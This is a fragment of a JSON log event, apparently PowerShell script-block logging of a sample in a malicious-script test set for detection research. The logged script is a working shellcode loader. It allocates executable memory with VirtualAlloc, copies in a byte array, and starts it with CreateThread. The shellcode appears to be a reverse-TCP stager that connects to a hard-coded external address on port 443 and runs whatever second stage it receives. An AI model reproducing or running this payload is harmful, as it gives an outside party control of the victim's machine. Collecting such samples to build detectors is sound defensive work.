C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2074.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5f,0x6f,0x5a,0x38,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"4b4ec627-472d-4dec-a6d0-d7b2e0865161","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2074.ps1"}}},"location":"EventChannel"}
